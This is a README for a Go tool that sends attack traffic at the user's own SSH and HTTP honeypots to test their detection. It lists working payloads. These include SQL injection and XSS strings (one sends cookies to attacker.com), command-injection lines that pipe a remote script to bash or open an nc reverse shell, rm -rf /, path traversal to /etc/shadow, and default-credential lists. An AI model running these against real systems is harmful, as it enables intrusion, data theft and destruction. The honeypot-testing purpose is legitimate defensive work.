# Go Attack Testing Tool

## Overview
A comprehensive attack testing tool written in 100% pure Go. Tests all attack vectors for both SSH and HTTP honeypots.

## Build

```bash
# Build the tester
go build -o tester ./cmd/tester/main.go

# Or build honeypot and tester together
go build -o honeypot .
go build -o tester ./cmd/tester/main.go
```

## Usage

### Basic Usage
```bash
# Test everything (SSH + HTTP)
./tester

# With custom targets
./tester --ssh-host 192.168.1.100 \
         --ssh-port 2222 \
         --ssh-user root \
         --ssh-pass toor \
         --http-url http://192.168.1.100:8080
```

### Options

| Flag | Default | Description |
|------|---------|-------------|
| `--ssh-host` | localhost | SSH honeypot host |
| `--ssh-port` | 2222 | SSH honeypot port |
| `--ssh-user` | root | Valid SSH username for login test |
| `--ssh-pass` | toor | Valid SSH password for login test |
| `--http-url` | http://localhost:8080 | HTTP honeypot base URL |
| `--ssh-only` | false | Test only SSH attacks |
| `--http-only` | false | Test only HTTP attacks |
| `--no-bruteforce` | false | Skip brute force tests |

### Examples

#### Test Only SSH
```bash
./tester --ssh-only \
         --ssh-user admin \
         --ssh-pass admin123
```

#### Test Only HTTP
```bash
./tester --http-only \
         --http-url http://example.com:8080
```

#### Skip Brute Force (Faster Testing)
```bash
./tester --no-bruteforce
```

#### Remote Honeypot Testing
```bash
./tester --ssh-host honeypot.example.com \
         --ssh-port 22 \
         --http-url https://honeypot.example.com
```

## Attack Types Tested

### SSH Attacks

#### 1. Brute Force Attack
- Tests 5 common password combinations
- Triggers brute force detection alerts
- Usernames: `admin`
- Passwords: `password`, `123456`, `admin`, `root`, `12345678`

#### 2. Valid Login
- Tests with configured fake credentials
- Establishes full SSH session
- Executes command battery

#### 3. Command Execution (20+ commands)
```
Basic Commands:
- ls, pwd, whoami, id
- uname -a, uptime, history

Reconnaissance:
- ps aux, netstat -tulpn
- ifconfig, df -h, top

File Access:
- cat /etc/passwd
- cat /etc/shadow
- cat /home/user/secret.txt

Malicious Activity:
- curl http://malicious.com/payload.sh
- wget http://evil.com/backdoor.sh
- rm -rf /
- chmod +x malware.sh
- ./malware.sh
```

### HTTP Attacks

#### 1. SQL Injection (9 payloads)
```sql
' OR '1'='1
admin' --
1' UNION SELECT NULL, username, password FROM users--
'; DROP TABLE users--
1' AND 1=1--
' OR 'x'='x
1; SELECT * FROM information_schema.tables--
admin' OR '1'='1' /*
' UNION ALL SELECT NULL,NULL,CONCAT(username,0x3a,password) FROM users--
```

#### 2. Cross-Site Scripting (7 payloads)
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
javascript:alert('XSS')
<iframe src='javascript:alert(1)'>
<body onload=alert('XSS')>
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

#### 3. Command Injection (6 payloads)
```bash
; ls -la
| cat /etc/passwd
`whoami`
$(wget http://evil.com/backdoor.sh)
; curl http://attacker.com/payload.sh | bash
| nc -e /bin/sh attacker.com 4444
```

#### 4. Path Traversal (6 payloads)
```
../../../etc/passwd
..\\..\\..\\windows\\system32\\config\\sam
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
../../../../../../etc/shadow
../../../var/www/html/.htpasswd
```

#### 5. Malicious File Upload (4 files)
- **shell.php** - PHP web shell
- **backdoor.jsp** - JSP backdoor
- **malware.exe** - Fake malware executable
- **webshell.phtml** - PHP alternative extension shell

#### 6. WordPress Attacks
Credential attempts:
- admin/admin
- admin/password
- admin/123456
- wordpress/wordpress

#### 7. phpMyAdmin Attacks
Credential attempts:
- root/(empty)
- root/root
- admin/admin
- pma/pma

#### 8. Scanner Detection
Simulates 5 common scanners:
- **Nikto** - Vulnerability scanner
- **SQLMap** - SQL injection tool
- **Nmap NSE** - Network mapper scripts
- **ZmEu** - Mass scanner
- **Masscan** - Port scanner

#### 9. Common Exploits (10 paths)
```
/cgi-bin/test.cgi
/..;/..;/..;/windows/system32/cmd.exe
/.env
/config.php.bak
/.git/config
/server-status
/.htaccess
/web.config
/robots.txt
/sitemap.xml
```

## Output

### Color-Coded Results
- 🟢 **Green ✓** - Test executed successfully
- 🔴 **Red ✗** - Test failed or error occurred
- 🟡 **Yellow** - Additional details/warnings

### Example Output
```
============================================================
SSH BRUTE FORCE ATTACK
============================================================

✓ Attempt 1: admin/password
  Failed as expected
✓ Attempt 2: admin/123456
  Failed as expected
...

============================================================
SSH COMMAND EXECUTION (root)
============================================================

✓ List files
  Command: ls
    Output: total 48
drwxr-xr-x  2 user user 4096 Jan 15 10:30 .
...
```

## Integration with Honeypot

### 1. Start the Honeypot
```bash
sudo ./honeypot
```

### 2. Run the Tester
```bash
./tester
```

### 3. View Results
Open dashboard: http://localhost:9090

Navigate to:
- **SSH Tab** → See SSH attacks, commands with IP & username
- **HTTP Tab** → See HTTP requests and attacks
- **Attacks Tab** → See all detected threats

## Performance

- **SSH Tests**: ~15-20 seconds
- **HTTP Tests**: ~30-40 seconds
- **Total**: ~50-60 seconds for full battery

Add `--no-bruteforce` to reduce time by ~5 seconds.

## Troubleshooting

### "connection refused"
```bash
# Check if honeypot is running
netstat -tlnp | grep 2222  # SSH
netstat -tlnp | grep 8080  # HTTP

# Start honeypot if not running
sudo ./honeypot
```

### "authentication failed" on valid login test
```bash
# Check config.yaml has the correct credentials
cat config.yaml | grep -A5 fake_users

# Default credentials are root/toor
./tester --ssh-user root --ssh-pass toor
```

### Build errors
```bash
# Make sure you have Go 1.16+
go version

# Install dependencies
go mod download

# Try clean build
go clean
go build -o tester ./cmd/tester/main.go
```

## Continuous Testing

### Automated Testing Loop
```bash
# Test every 5 minutes
while true; do
    ./tester
    sleep 300
done
```

### Systemd Service
Create `/etc/systemd/system/honeypot-tester.timer`:
```ini
[Unit]
Description=Honeypot Attack Tester

[Timer]
OnCalendar=*:0/5
Persistent=true

[Install]
WantedBy=timers.target
```

## Security Warning

⚠️ **WARNING**: This tool generates real attack traffic!

**Only use against:**
- Your own honeypot systems
- Systems you have explicit permission to test
- Isolated lab environments

**DO NOT use against:**
- Production systems
- Systems you don't own
- Public infrastructure
- Without authorization

Unauthorized testing may be illegal in your jurisdiction.

## Contributing

To add new attack tests:

1. Edit `cmd/tester/main.go`
2. Add new test function (e.g., `testHTTPNewAttack`)
3. Call it from `main()`
4. Update this documentation

## Dependencies

- `golang.org/x/crypto/ssh` - SSH client

No other external dependencies required!

## License

Part of the HoneyGuard honeypot project.
